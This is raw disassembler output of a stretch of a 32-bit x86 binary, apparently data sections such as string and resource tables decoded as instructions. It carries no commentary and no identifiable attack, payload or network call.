  4107f5:	dec    edx
  4107f6:	cmp    BYTE PTR [ebx+eax*2+0x5f],dl
  4107fa:	cmp    DWORD PTR [ecx],edi
  4107fc:	add    BYTE PTR [eax+0x4e],dl
  4107ff:	xor    al,0x5f
  410801:	dec    esi
  410802:	inc    esp
  410803:	xor    DWORD PTR [edi],esi
  410805:	pop    edi
  410806:	cmp    DWORD PTR [ecx+0x41],edx
  410809:	add    BYTE PTR [edx+0x54],cl
  41080c:	xor    bl,BYTE PTR [edi+0x50]
  41080f:	push   ebx
  410810:	push   esi
  410811:	inc    esp
  410812:	pop    edi
  410813:	push   edx
  410814:	xor    BYTE PTR [ecx+0x0],bl
  410817:	push   esi
  410818:	inc    esp
  410819:	push   esp
  41081a:	pop    edi
  41081b:	dec    esp
  41081c:	xor    al,0x33
  41081e:	cmp    DWORD PTR [eax+eax*1+0x59],edx
  410822:	inc    edi
  410823:	inc    ebp
  410824:	pop    edi
  410825:	push   ebp
  410826:	pop    edx
  410827:	push   eax
  410828:	dec    edi
  410829:	pop    edi
  41082a:	push   esi
  41082b:	xor    BYTE PTR [eax],al
  41082d:	pop    eax
  41082e:	push   edi
  41082f:	push   esi
  410830:	cmp    BYTE PTR [edi+0x47],bl
  410833:	dec    ecx
  410834:	push   esp
  410835:	push   edx
  410836:	dec    ebx
  410837:	xor    BYTE PTR [edi+0x0],cl
  41083a:	dec    ecx
  41083b:	dec    esi
  41083c:	xor    eax,0x33345f30
  410841:	push   eax
  410842:	dec    edx
  410843:	cmp    BYTE PTR [eax],al
  410845:	pop    eax
  410846:	inc    ecx
  410847:	dec    esi
  410848:	pop    edi
  410849:	inc    edx
  41084a:	push   ebp
  41084b:	push   ecx
  41084c:	pop    edi
  41084d:	inc    ecx
  41084e:	add    BYTE PTR [edi+0x58],al
  410851:	xor    BYTE PTR [edi+0x4c],bl
  410854:	dec    ebp
  410855:	cmp    DWORD PTR [ebp+0x5f],edx
  410858:	push   esp
  410859:	push   edx
  41085a:	add    BYTE PTR [eax+0x38],cl
  41085d:	dec    edi
  41085e:	xor    eax,0x594b535f
  410863:	xor    BYTE PTR [ebp+0x0],cl
  410866:	inc    ecx
  410867:	dec    eax
  410868:	xor    DWORD PTR [edi+0x4e],ebx
  41086b:	ss inc esp
  41086d:	dec    eax
  41086e:	cmp    DWORD PTR [eax],eax
  410870:	push   esi
  410871:	push   esp
  410872:	aaa    
  410873:	xor    bh,BYTE PTR [ecx]
  410875:	xor    al,0x31
  410877:	pop    edi
  410878:	push   edx
  410879:	push   edi
  41087a:	push   edx
  41087b:	dec    ecx
  41087c:	pop    edi
  41087d:	inc    esp
  41087e:	add    BYTE PTR [edi+0x52],dl
  410881:	pop    ecx
  410882:	xor    eax,0x5045395f
  410887:	pop    edi
  410888:	xor    eax,DWORD PTR [eax]
  41088a:	inc    ebp
  41088b:	xor    dl,BYTE PTR [ebx+0x39]
  41088e:	xor    dh,BYTE PTR [esi]
  410890:	xor    eax,0x4900525f
  410895:	push   esp
  410896:	xor    bl,BYTE PTR [edi+0x41]
  410899:	dec    edx
  41089a:	xor    eax,0x4c3737
  41089f:	push   ecx
  4108a0:	add    BYTE PTR [edi+0x0],al
  4108a3:	pop    ecx
  4108a4:	add    BYTE PTR [edi+0x0],bl
  4108a7:	push   ebx
  4108a8:	add    BYTE PTR [ebx+0x0],al
  4108ab:	xor    al,BYTE PTR [eax]
  4108ad:	pop    edx
  4108ae:	add    BYTE PTR [edi+0x0],dl
  4108b1:	add    BYTE PTR [eax],al
  4108b3:	push   edx
  4108b4:	add    BYTE PTR [eax+eax*1+0x4d],dl
  4108b8:	add    BYTE PTR [edi+0x0],bl
  4108bb:	dec    eax
  4108bc:	add    BYTE PTR [ebx+0x0],cl
  4108bf:	xor    DWORD PTR [eax],eax
  4108c1:	pop    edi
  4108c2:	add    BYTE PTR [ecx+0x0],al
  4108c5:	push   ebp
  4108c6:	add    BYTE PTR [ecx],bh
  4108c8:	add    BYTE PTR [esi+0x0],dl
  4108cb:	xor    al,BYTE PTR [eax]
  4108cd:	pop    edi
  4108ce:	add    BYTE PTR [edx],dh
  4108d0:	add    BYTE PTR [eax],al
  4108d2:	add    BYTE PTR [ecx+0x0],dl
  4108d5:	xor    al,0x0
  4108d7:	inc    edx
  4108d8:	add    BYTE PTR [edi+0x0],bl
  4108db:	inc    esp
  4108dc:	add    BYTE PTR [esi+0x0],dl
  4108df:	xor    eax,0x5f005500
  4108e4:	add    BYTE PTR [ebx+0x0],al
  4108e7:	inc    ebx
  4108e8:	add    BYTE PTR [eax],al
  4108ea:	add    BYTE PTR [eax+0x0],cl
  4108ed:	inc    edx
  4108ee:	add    BYTE PTR [ecx+0x0],dl
  4108f1:	pop    edi
  4108f2:	add    BYTE PTR [eax+eax*1+0x38],dl
  4108f6:	add    BYTE PTR [eax+0x0],dl
  4108f9:	push   edx
  4108fa:	add    BYTE PTR [ecx+0x0],cl
  4108fd:	pop    edi
  4108fe:	add    BYTE PTR [ebp+0x0],al
  410901:	dec    ebp
  410902:	add    BYTE PTR [ebp+0x0],dl
  410905:	add    BYTE PTR [eax],al
  410907:	inc    edi
  410908:	add    BYTE PTR [edi+0x0],cl
  41090b:	xor    eax,0x32005f00
  410910:	add    BYTE PTR [ebx+0x0],dl
  410913:	inc    ebp
  410914:	add    BYTE PTR [ecx],bh
  410916:	add    BYTE PTR [esi],dh
  410918:	add    BYTE PTR [edi+0x0],bl
  41091b:	pop    eax
  41091c:	add    BYTE PTR [edx+0x0],bl
  41091f:	xor    al,0x0
  410921:	pop    edi
  410922:	add    BYTE PTR [edi+0x0],cl
  410925:	add    BYTE PTR [eax],al
  410927:	push   ebx
  410928:	add    BYTE PTR [eax],dh
  41092a:	add    BYTE PTR [ecx+0x0],dl
  41092d:	pop    edi
  41092e:	add    BYTE PTR [ebp+0x0],dl
  410931:	dec    ecx
  410932:	add    BYTE PTR [ecx+0x0],bl
  410935:	xor    al,BYTE PTR [eax]
  410937:	add    BYTE PTR [eax],al
  410939:	dec    eax
  41093a:	add    BYTE PTR [edi],dh
  41093c:	add    BYTE PTR [ecx+0x0],bl
  41093f:	aaa    
  410940:	add    BYTE PTR [edi+0x0],bl
  410943:	inc    esi
  410944:	add    BYTE PTR [edi],dh
  410946:	add    BYTE PTR [ecx+0x0],bl
  410949:	inc    esp
  41094a:	add    BYTE PTR [edi+0x0],bl
  41094d:	xor    eax,0x52000000
  410952:	add    BYTE PTR [eax+0x0],dl
  410955:	inc    esi
  410956:	add    BYTE PTR [edi+0x0],bl
  410959:	dec    esp
  41095a:	add    BYTE PTR [ecx+0x0],al
  41095d:	push   eax
  41095e:	add    BYTE PTR [edi+0x0],bl
  410961:	inc    ecx
  410962:	add    BYTE PTR [edi],dh
  410964:	add    BYTE PTR [eax+eax*1+0x4a],al
  410968:	add    BYTE PTR [ebp+0x0],al
  41096b:	pop    edi
  41096c:	add    BYTE PTR [eax+eax*1],dh
  41096f:	add    BYTE PTR [eax],al
  410971:	dec    esp
  410972:	add    BYTE PTR [edi],dh
  410974:	add    BYTE PTR [ebp+0x0],cl
  410977:	cmp    BYTE PTR [eax],al
  410979:	xor    al,BYTE PTR [eax]
  41097b:	pop    edi
  41097c:	add    BYTE PTR [eax],bh
  41097e:	add    BYTE PTR [ecx+0x0],al
  410981:	pop    edx
  410982:	add    BYTE PTR [edx+0x0],bl
  410985:	pop    edi
  410986:	add    BYTE PTR [ebx],dh
  410988:	add    BYTE PTR [ebx+0x0],dl
  41098b:	add    BYTE PTR [eax],al
  41098d:	push   esi
  41098e:	add    BYTE PTR [eax],bh
  410990:	add    BYTE PTR [esi+0x0],dl
  410993:	xor    al,BYTE PTR [eax]
  410995:	pop    edi
  410996:	add    BYTE PTR [esi+0x0],al
  410999:	inc    ebx
  41099a:	add    BYTE PTR [edi+0x0],al
  41099d:	push   edi
  41099e:	add    BYTE PTR [edi+0x0],bl
  4109a1:	dec    eax
  4109a2:	add    BYTE PTR [edx+0x0],cl
  4109a5:	cmp    DWORD PTR [eax],eax
  4109a7:	aaa    
  4109a8:	add    BYTE PTR [eax],al
  4109aa:	add    BYTE PTR [ecx+0x0],cl
  4109ad:	dec    edx
  4109ae:	add    BYTE PTR [ecx+0x0],al
  4109b1:	pop    edi
  4109b2:	add    BYTE PTR [edx+0x0],cl
  4109b5:	inc    esi
  4109b6:	add    BYTE PTR [edi+0x0],dl
  4109b9:	xor    eax,DWORD PTR [eax]
  4109bb:	dec    ebp
  4109bc:	add    BYTE PTR [edi+0x0],bl
  4109bf:	push   eax
  4109c0:	add    BYTE PTR [ecx+0x0],al
  4109c3:	add    BYTE PTR [eax],al
  4109c5:	dec    edi
  4109c6:	add    BYTE PTR [ecx+0x0],bl
  4109c9:	dec    eax
  4109ca:	add    BYTE PTR [edi+0x0],bl
  4109cd:	xor    eax,0x0
	...
  4109da:	add    al,0x0
  4109dc:	add    BYTE PTR [eax],al
  4109de:	or     al,0x0
  4109e0:	add    BYTE PTR [eax],al
  4109e2:	rol    BYTE PTR [esi],1
  4109e4:	add    BYTE PTR [eax-0x7fffff90],al
  4109ea:	or     al,BYTE PTR [edi]
  4109ec:	add    BYTE PTR [eax-0x7fffff70],al
  4109f2:	xor    al,0x7
  4109f4:	add    BYTE PTR [eax-0x7fffff58],al
  4109fa:	pusha  
  4109fb:	pop    es
  4109fc:	add    BYTE PTR [eax-0x7fffff40],al
  410a02:	loopne 0x410a0b
  410a04:	add    BYTE PTR [eax-0x7fffff08],al
  410a0a:	adc    BYTE PTR [eax],cl
  410a0c:	add    BYTE PTR [eax-0x7ffffee0],al
  410a12:	sub    BYTE PTR [eax],cl
  410a14:	add    BYTE PTR [eax-0x7ffffec8],al
  410a1a:	pop    eax
  410a1b:	or     BYTE PTR [eax],al
  410a1d:	adc    BYTE PTR [eax+0x1],0x0
  410a21:	cmp    BYTE PTR [edx-0x7f7ffff8],0x1
  410a28:	add    BYTE PTR [eax-0x7ffff714],al
  410a2e:	mov    al,ds:0xa800001
  410a33:	or     DWORD PTR [eax],eax
  410a35:	adc    al,0x1
  410a38:	add    BYTE PTR [eax-0x7ffff6dc],al
  410a3e:	lock add DWORD PTR [eax],eax
  410a41:	add    BYTE PTR [eax],0x0
  410a44:	add    BYTE PTR [eax],al
  410a46:	add    BYTE PTR [eax],al
  410a48:	add    BYTE PTR [eax],al
  410a4a:	add    al,0x0
  410a4c:	add    BYTE PTR [eax],al
  410a4e:	add    DWORD PTR [eax],eax
  410a50:	add    DWORD PTR [eax],eax
  410a52:	in     al,dx
  410a53:	push   es
  410a54:	add    BYTE PTR [eax-0x7ffffde0],al
  410a5a:	in     eax,dx
  410a5b:	push   0x0
  410a5d:	add    BYTE PTR [eax],bh
  410a5f:	add    al,BYTE PTR [eax]
  410a61:	add    BYTE PTR [eax],0x0
  410a64:	add    BYTE PTR [eax],al
  410a66:	add    BYTE PTR [eax],al
  410a68:	add    BYTE PTR [eax],al
  410a6a:	add    al,0x0
  410a6c:	add    BYTE PTR [eax],al
  410a6e:	add    DWORD PTR [eax],eax
  410a70:	add    BYTE PTR [eax],al
  410a72:	sbb    al,0x7
  410a74:	add    BYTE PTR [eax-0x7ffffdb0],al
	...
  410a82:	add    al,0x0
  410a84:	add    BYTE PTR [eax],al
  410a86:	add    DWORD PTR [eax],eax
  410a88:	add    BYTE PTR [eax],al
  410a8a:	dec    esi
  410a8b:	pop    es
  410a8c:	add    BYTE PTR [eax-0x7ffffd98],al
	...
  410a9a:	add    al,0x0
  410a9c:	add    BYTE PTR [eax],al
  410a9e:	add    eax,0x72000000
  410aa3:	pop    es
  410aa4:	add    BYTE PTR [eax-0x7ffffd80],al
  410aaa:	test   BYTE PTR [edi],al
  410aac:	add    BYTE PTR [eax-0x7ffffd68],al
  410ab2:	call   0x2:0xb0800007
  410ab9:	xor    BYTE PTR [edx-0x377ffff9],0x2
  410ac0:	add    BYTE PTR [eax-0x7ffff834],al
  410ac6:	loopne 0x410aca
  410ac8:	add    BYTE PTR [eax+0x0],al
  410ace:	add    BYTE PTR [eax],al
  410ad0:	add    BYTE PTR [eax],al
  410ad2:	add    al,0x0
  410ad4:	add    BYTE PTR [eax],al
  410ad6:	add    DWORD PTR [eax],eax
  410ad8:	add    al,BYTE PTR [eax]
  410ada:	inc    BYTE PTR [edi]
  410adc:	add    BYTE PTR [eax-0x7ffffd08],al
  410ae2:	ins    BYTE PTR es:[edi],dx
  410ae3:	adc    DWORD PTR [eax],eax
  410ae5:	add    BYTE PTR [eax],dl
  410ae7:	add    eax,DWORD PTR [eax]
  410ae9:	sub    BYTE PTR [ebp+0x28000024],0x3
  410af0:	add    BYTE PTR [eax+0x0],al
  410af6:	add    BYTE PTR [eax],al
  410af8:	add    BYTE PTR [eax],al
  410afa:	add    al,0x0
  410afc:	add    BYTE PTR [eax],al
  410afe:	add    BYTE PTR [eax],al
  410b00:	add    DWORD PTR [eax],eax
  410b02:	mov    esp,0x40000047
  410b07:	add    eax,DWORD PTR [eax]
  410b09:	add    BYTE PTR [eax],0x0
  410b0c:	add    BYTE PTR [eax],al
  410b0e:	add    BYTE PTR [eax],al
  410b10:	add    BYTE PTR [eax],al
  410b12:	add    al,0x0
  410b14:	add    BYTE PTR [eax],al
  410b16:	add    DWORD PTR [eax],eax
  410b18:	add    BYTE PTR [eax],al
  410b1a:	inc    esp
  410b1b:	or     BYTE PTR [eax],al
  410b1d:	sbb    BYTE PTR [eax+0x3],0x0
  410b21:	add    BYTE PTR [eax],0x0
  410b24:	add    BYTE PTR [eax],al
  410b26:	add    BYTE PTR [eax],al
  410b28:	add    BYTE PTR [eax],al
  410b2a:	add    al,0x0
  410b2c:	add    BYTE PTR [eax],al
  410b2e:	add    eax,DWORD PTR [eax]
  410b30:	add    DWORD PTR [eax],eax
  410b32:	outs   dx,BYTE PTR ds:[esi]
  410b33:	or     BYTE PTR [eax],al
  410b35:	xor    BYTE PTR [eax+0x3],0x0
  410b39:	add    BYTE PTR [eax+ecx*1+0x3888000],0x0
  410b41:	sbb    BYTE PTR [eax+ecx*1+0x3a08000],0x0
  410b49:	cmp    BYTE PTR [esi],0x75
  410b4c:	add    BYTE PTR [eax],al
  410b4e:	mov    eax,0x800003
  410b53:	add    BYTE PTR [eax],al
  410b55:	add    BYTE PTR [eax],al
  410b57:	add    BYTE PTR [eax],al
  410b59:	add    BYTE PTR [eax+eax*1],al
  410b5c:	add    BYTE PTR [eax],al
  410b5e:	add    DWORD PTR [eax],eax
  410b60:	add    DWORD PTR [eax],eax
  410b62:	ror    BYTE PTR [eax],cl
  410b64:	add    BYTE PTR [eax-0x7ffffc30],al
  410b6a:	jae    0x410bd0
  410b6c:	add    BYTE PTR [eax],al
  410b6e:	call   0xc10b76
  410b73:	add    BYTE PTR [eax],al
  410b75:	add    BYTE PTR [eax],al
  410b77:	add    BYTE PTR [eax],al
  410b79:	add    BYTE PTR [eax+eax*1],al
  410b7c:	add    BYTE PTR [eax],al
  410b7e:	add    BYTE PTR [eax],al
  410b80:	add    al,0x0
  410b82:	jmp    0x410b9e
  410b84:	add    BYTE PTR [eax],al
  410b86:	add    BYTE PTR [eax+eax*1],al
  410b89:	add    ch,0x3a
  410b8c:	add    BYTE PTR [eax],al
  410b8e:	sbb    BYTE PTR [eax+eax*1],al
  410b91:	sub    BYTE PTR [ebx+0x30000040],0x4
  410b98:	add    BYTE PTR [eax+0x4b9e],al
  410b9e:	dec    eax
  410b9f:	add    al,0x0
  410ba1:	add    BYTE PTR [eax],0x0
  410ba4:	add    BYTE PTR [eax],al
  410ba6:	add    BYTE PTR [eax],al
  410ba8:	add    BYTE PTR [eax],al
  410baa:	add    al,0x0
  410bac:	add    BYTE PTR [eax],al
  410bae:	add    BYTE PTR [eax],al
  410bb0:	add    al,BYTE PTR [eax]
  410bb2:	repz and al,0x0
  410bb5:	add    BYTE PTR [eax+0x4],ah
  410bb8:	add    BYTE PTR [eax+0x2ca1],al
  410bbe:	js     0x410bc4
  410bc0:	add    BYTE PTR [eax+0x0],al
  410bc6:	add    BYTE PTR [eax],al
  410bc8:	add    BYTE PTR [eax],al
  410bca:	add    al,0x0
  410bcc:	add    BYTE PTR [eax],al
  410bce:	add    DWORD PTR [eax],eax
  410bd0:	add    eax,DWORD PTR [eax]
  410bd2:	or     DWORD PTR ss:[eax],eax
  410bd5:	adc    BYTE PTR [eax-0xa7ffffc],0xf
  410bdc:	add    BYTE PTR [eax],al
  410bde:	test   al,0x4
  410be0:	add    BYTE PTR [eax+0x1e90],al
  410be6:	rol    BYTE PTR [eax+eax*1],0x80
  410bea:	bound  esp,QWORD PTR [edi]
  410bec:	add    BYTE PTR [eax],al
  410bee:	fadd   DWORD PTR [eax+eax*1]
  410bf1:	add    BYTE PTR [eax],0x0
  410bf4:	add    BYTE PTR [eax],al
  410bf6:	add    BYTE PTR [eax],al
  410bf8:	add    BYTE PTR [eax],al
  410bfa:	add    al,0x0
  410bfc:	add    BYTE PTR [eax],al
  410bfe:	add    BYTE PTR [eax],al
  410c00:	add    DWORD PTR [eax],eax
  410c02:	or     DWORD PTR [eax+eax*1],eax
  410c05:	add    al,dh
  410c07:	add    al,0x0
	...
  410c11:	add    BYTE PTR [eax+eax*1],al
  410c14:	add    BYTE PTR [eax],al
  410c16:	add    BYTE PTR [eax],al
  410c18:	add    DWORD PTR [eax],eax
  410c1a:	or     DWORD PTR [eax+eax*1],eax
  410c1d:	add    BYTE PTR [eax],al
  410c1f:	add    eax,0x0
  410c24:	add    BYTE PTR [eax],al
  410c26:	add    BYTE PTR [eax],al
  410c28:	add    BYTE PTR [eax],al
  410c2a:	add    al,0x0
  410c2c:	add    BYTE PTR [eax],al
  410c2e:	add    BYTE PTR [eax],al
  410c30:	add    DWORD PTR [eax],eax
  410c32:	or     DWORD PTR [eax+eax*1],eax
  410c35:	add    BYTE PTR [eax],dl
  410c37:	add    eax,0x0
  410c3c:	add    BYTE PTR [eax],al
  410c3e:	add    BYTE PTR [eax],al
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    al,0x0
  410c44:	add    BYTE PTR [eax],al
  410c46:	add    BYTE PTR [eax],al
  410c48:	add    DWORD PTR [eax],eax
  410c4a:	or     DWORD PTR [eax+eax*1],eax
  410c4d:	add    BYTE PTR [eax],ah
  410c4f:	add    eax,0x0
  410c54:	add    BYTE PTR [eax],al
  410c56:	add    BYTE PTR [eax],al
  410c58:	add    BYTE PTR [eax],al
  410c5a:	add    al,0x0
  410c5c:	add    BYTE PTR [eax],al
  410c5e:	add    BYTE PTR [eax],al
  410c60:	add    DWORD PTR [eax],eax
  410c62:	or     DWORD PTR [eax+eax*1],eax
  410c65:	add    BYTE PTR [eax],dh
  410c67:	add    eax,0x0
  410c6c:	add    BYTE PTR [eax],al
  410c6e:	add    BYTE PTR [eax],al
  410c70:	add    BYTE PTR [eax],al
  410c72:	add    al,0x0
  410c74:	add    BYTE PTR [eax],al
  410c76:	add    BYTE PTR [eax],al
  410c78:	add    DWORD PTR [eax],eax
  410c7a:	or     DWORD PTR [eax+eax*1],eax
  410c7d:	add    BYTE PTR [eax+0x5],al
	...
  410c88:	add    BYTE PTR [eax],al
  410c8a:	add    al,0x0
  410c8c:	add    BYTE PTR [eax],al
  410c8e:	add    BYTE PTR [eax],al
  410c90:	add    DWORD PTR [eax],eax
  410c92:	or     DWORD PTR [eax+eax*1],eax
  410c95:	add    BYTE PTR [eax+0x5],dl
	...
  410ca0:	add    BYTE PTR [eax],al
  410ca2:	add    al,0x0
  410ca4:	add    BYTE PTR [eax],al
  410ca6:	add    BYTE PTR [eax],al
  410ca8:	add    DWORD PTR [eax],eax
  410caa:	or     DWORD PTR [eax+eax*1],eax
  410cad:	add    BYTE PTR [eax+0x5],ah
	...
  410cb8:	add    BYTE PTR [eax],al
  410cba:	add    al,0x0
  410cbc:	add    BYTE PTR [eax],al
  410cbe:	add    BYTE PTR [eax],al
  410cc0:	add    DWORD PTR [eax],eax
  410cc2:	or     DWORD PTR [eax+eax*1],eax
  410cc5:	add    BYTE PTR [eax+0x5],dh
	...
  410cd0:	add    BYTE PTR [eax],al
  410cd2:	add    al,0x0
  410cd4:	add    BYTE PTR [eax],al
  410cd6:	add    BYTE PTR [eax],al
  410cd8:	add    DWORD PTR [eax],eax
  410cda:	or     DWORD PTR [eax+eax*1],eax
  410cdd:	add    BYTE PTR [eax+0x5],al
  410ce3:	add    BYTE PTR [eax],al
  410ce5:	add    BYTE PTR [eax],al
  410ce7:	add    BYTE PTR [eax],al
  410ce9:	add    BYTE PTR [eax+eax*1],al
  410cec:	add    BYTE PTR [eax],al
  410cee:	add    BYTE PTR [eax],al
  410cf0:	add    DWORD PTR [eax],eax
  410cf2:	or     DWORD PTR [eax+eax*1],eax
  410cf5:	add    BYTE PTR [eax+0x5],dl
  410cfb:	add    BYTE PTR [eax],al
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    BYTE PTR [eax],al
  410d01:	add    BYTE PTR [eax+eax*1],al
  410d04:	add    BYTE PTR [eax],al
  410d06:	add    BYTE PTR [eax],al
  410d08:	add    DWORD PTR [eax],eax
  410d0a:	or     DWORD PTR [eax+eax*1],eax
  410d0d:	add    BYTE PTR [eax+0x5],ah
  410d13:	add    BYTE PTR [eax],al
  410d15:	add    BYTE PTR [eax],al
  410d17:	add    BYTE PTR [eax],al
  410d19:	add    BYTE PTR [eax+eax*1],al
  410d1c:	add    BYTE PTR [eax],al
  410d1e:	add    BYTE PTR [eax],al
  410d20:	add    DWORD PTR [eax],eax
  410d22:	or     DWORD PTR [eax+eax*1],eax
  410d25:	add    BYTE PTR [eax+0x5],dh
  410d2b:	add    BYTE PTR [eax],al
  410d2d:	add    BYTE PTR [eax],al
  410d2f:	add    BYTE PTR [eax],al
  410d31:	add    BYTE PTR [eax+eax*1],al
  410d34:	add    BYTE PTR [eax],al
  410d36:	add    BYTE PTR [eax],al
  410d38:	add    DWORD PTR [eax],eax
  410d3a:	or     DWORD PTR [eax+eax*1],eax
  410d3d:	add    al,al
  410d3f:	add    eax,0x0
  410d44:	add    BYTE PTR [eax],al
  410d46:	add    BYTE PTR [eax],al
  410d48:	add    BYTE PTR [eax],al
  410d4a:	add    al,0x0
  410d4c:	add    BYTE PTR [eax],al
  410d4e:	add    BYTE PTR [eax],al
  410d50:	add    DWORD PTR [eax],eax
  410d52:	or     DWORD PTR [eax+eax*1],eax
  410d55:	add    al,dl
  410d57:	add    eax,0x0
  410d5c:	add    BYTE PTR [eax],al
  410d5e:	add    BYTE PTR [eax],al
  410d60:	add    BYTE PTR [eax],al
  410d62:	add    al,0x0
  410d64:	add    BYTE PTR [eax],al
  410d66:	add    BYTE PTR [eax],al
  410d68:	add    DWORD PTR [eax],eax
  410d6a:	or     DWORD PTR [eax+eax*1],eax
  410d6d:	add    al,ah
  410d6f:	add    eax,0x0
  410d74:	add    BYTE PTR [eax],al
  410d76:	add    BYTE PTR [eax],al
  410d78:	add    BYTE PTR [eax],al
  410d7a:	add    al,0x0
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	add    BYTE PTR [eax],al
  410d80:	add    DWORD PTR [eax],eax
  410d82:	or     DWORD PTR [eax+eax*1],eax
  410d85:	add    al,dh
  410d87:	add    eax,0x0
  410d8c:	add    BYTE PTR [eax],al
  410d8e:	add    BYTE PTR [eax],al
  410d90:	add    BYTE PTR [eax],al
  410d92:	add    al,0x0
  410d94:	add    BYTE PTR [eax],al
  410d96:	add    BYTE PTR [eax],al
  410d98:	add    DWORD PTR [eax],eax
  410d9a:	or     DWORD PTR [eax+eax*1],eax
  410d9d:	add    BYTE PTR [eax],al
  410d9f:	push   es
	...
  410da8:	add    BYTE PTR [eax],al
  410daa:	add    al,0x0
  410dac:	add    BYTE PTR [eax],al
  410dae:	add    BYTE PTR [eax],al
  410db0:	add    DWORD PTR [eax],eax
  410db2:	or     DWORD PTR [eax+eax*1],eax
  410db5:	add    BYTE PTR [eax],dl
  410db7:	push   es
	...
  410dc0:	add    BYTE PTR [eax],al
  410dc2:	add    al,0x0
  410dc4:	add    BYTE PTR [eax],al
  410dc6:	add    BYTE PTR [eax],al
  410dc8:	add    DWORD PTR [eax],eax
  410dca:	or     DWORD PTR [eax+eax*1],eax
  410dcd:	add    BYTE PTR [eax],ah
  410dcf:	push   es
	...
  410dd8:	add    BYTE PTR [eax],al
  410dda:	add    al,0x0
  410ddc:	add    BYTE PTR [eax],al
  410dde:	add    BYTE PTR [eax],al
  410de0:	add    DWORD PTR [eax],eax
  410de2:	or     DWORD PTR [eax+eax*1],eax
  410de5:	add    BYTE PTR [eax],dh
  410de7:	push   es
	...
  410df0:	add    BYTE PTR [eax],al
  410df2:	add    al,0x0
  410df4:	add    BYTE PTR [eax],al
  410df6:	add    BYTE PTR [eax],al
  410df8:	add    DWORD PTR [eax],eax
  410dfa:	or     DWORD PTR [eax+eax*1],eax
  410dfd:	add    BYTE PTR [eax+0x6],al
	...
  410e08:	add    BYTE PTR [eax],al
  410e0a:	add    al,0x0
  410e0c:	add    BYTE PTR [eax],al
  410e0e:	add    BYTE PTR [eax],al
  410e10:	add    DWORD PTR [eax],eax
  410e12:	or     DWORD PTR [eax+eax*1],eax
  410e15:	add    BYTE PTR [eax+0x6],dl
	...
  410e20:	add    BYTE PTR [eax],al
  410e22:	add    al,0x0
  410e24:	add    BYTE PTR [eax],al
  410e26:	add    BYTE PTR [eax],al
  410e28:	add    DWORD PTR [eax],eax
  410e2a:	or     DWORD PTR [eax+eax*1],eax
  410e2d:	add    BYTE PTR [eax+0x6],ah
	...
  410e38:	add    BYTE PTR [eax],al
  410e3a:	add    al,0x0
  410e3c:	add    BYTE PTR [eax],al
  410e3e:	add    BYTE PTR [eax],al
  410e40:	add    DWORD PTR [eax],eax
  410e42:	or     DWORD PTR [eax+eax*1],eax
  410e45:	add    BYTE PTR [eax+0x6],dh
	...
  410e50:	add    BYTE PTR [eax],al
  410e52:	add    al,0x0
  410e54:	add    BYTE PTR [eax],al
  410e56:	add    BYTE PTR [eax],al
  410e58:	add    DWORD PTR [eax],eax
  410e5a:	or     DWORD PTR [eax+eax*1],eax
  410e5d:	add    BYTE PTR [eax+0x6],al
  410e63:	add    BYTE PTR [eax],al
  410e65:	add    BYTE PTR [eax],al
  410e67:	add    BYTE PTR [eax],al
  410e69:	add    BYTE PTR [eax+eax*1],al
  410e6c:	add    BYTE PTR [eax],al
  410e6e:	add    BYTE PTR [eax],al
  410e70:	add    DWORD PTR [eax],eax
  410e72:	or     DWORD PTR [eax+eax*1],eax
  410e75:	add    BYTE PTR [eax+0x6],dl
  410e7b:	add    BYTE PTR [eax],al
  410e7d:	add    BYTE PTR [eax],al
  410e7f:	add    BYTE PTR [eax],al
  410e81:	add    BYTE PTR [eax+eax*1],al
  410e84:	add    BYTE PTR [eax],al
  410e86:	add    BYTE PTR [eax],al
  410e88:	add    DWORD PTR [eax],eax
  410e8a:	or     DWORD PTR [eax+eax*1],eax
  410e8d:	add    BYTE PTR [eax+0x6],ah
  410e93:	add    BYTE PTR [eax],al
  410e95:	add    BYTE PTR [eax],al
  410e97:	add    BYTE PTR [eax],al
  410e99:	add    BYTE PTR [eax+eax*1],al
  410e9c:	add    BYTE PTR [eax],al
  410e9e:	add    BYTE PTR [eax],al
  410ea0:	add    DWORD PTR [eax],eax
  410ea2:	or     DWORD PTR [eax+eax*1],eax
  410ea5:	add    BYTE PTR [eax+0x6],dh
  410eab:	add    BYTE PTR [eax],al
  410ead:	add    BYTE PTR [eax],al
  410eaf:	add    BYTE PTR [eax],al
  410eb1:	add    BYTE PTR [eax+eax*1],al
  410eb4:	add    BYTE PTR [eax],al
  410eb6:	add    BYTE PTR [eax],al
  410eb8:	add    DWORD PTR [eax],eax
  410eba:	or     DWORD PTR [eax+eax*1],eax
  410ebd:	add    al,al
  410ebf:	push   es
  410ec0:	add    BYTE PTR [eax],al
  410ec2:	xor    dl,BYTE PTR [ebx]
  410ec4:	add    DWORD PTR [eax],eax
  410ec6:	adc    al,0x9
  410ec8:	add    BYTE PTR [eax],al
  410eca:	in     al,0x4
  410ecc:	add    BYTE PTR [eax],al
  410ece:	add    BYTE PTR [eax],al
  410ed0:	add    BYTE PTR [eax],al
  410ed2:	inc    esi
  410ed3:	sbb    al,0x1
  410ed5:	add    BYTE PTR [ecx+ecx*1],dl
  410ed8:	add    BYTE PTR [eax],al
  410eda:	in     al,0x4
  410edc:	add    BYTE PTR [eax],al
  410ede:	add    BYTE PTR [eax],al
  410ee0:	add    BYTE PTR [eax],al
  410ee2:	pop    edx
  410ee3:	and    eax,0x9140001
  410ee8:	add    BYTE PTR [eax],al
  410eea:	in     al,0x4
  410eec:	add    BYTE PTR [eax],al
  410eee:	add    BYTE PTR [eax],al
  410ef0:	add    BYTE PTR [eax],al
  410ef2:	outs   dx,BYTE PTR ds:[esi]
  410ef3:	add    DWORD PTR cs:[eax],eax
  410ef6:	or     ecx,DWORD PTR [ecx]
  410ef8:	add    BYTE PTR [eax],al
  410efa:	in     al,0x4
  410efc:	add    BYTE PTR [eax],al
  410efe:	add    BYTE PTR [eax],al
  410f00:	add    BYTE PTR [eax],al
  410f02:	jns    0x410f3b
  410f04:	add    DWORD PTR [eax],eax
  410f06:	adc    BYTE PTR [ecx],cl
  410f08:	add    BYTE PTR [eax],al
  410f0a:	in     al,0x4
  410f0c:	add    BYTE PTR [eax],al
  410f0e:	add    BYTE PTR [eax],al
  410f10:	add    BYTE PTR [eax],al
  410f12:	mov    DWORD PTR [eax+0x1],eax
  410f15:	add    BYTE PTR [eax],cl
  410f17:	or     DWORD PTR [eax],eax
  410f19:	add    ah,ah
  410f1b:	add    al,0x0
  410f1d:	add    BYTE PTR [eax],al
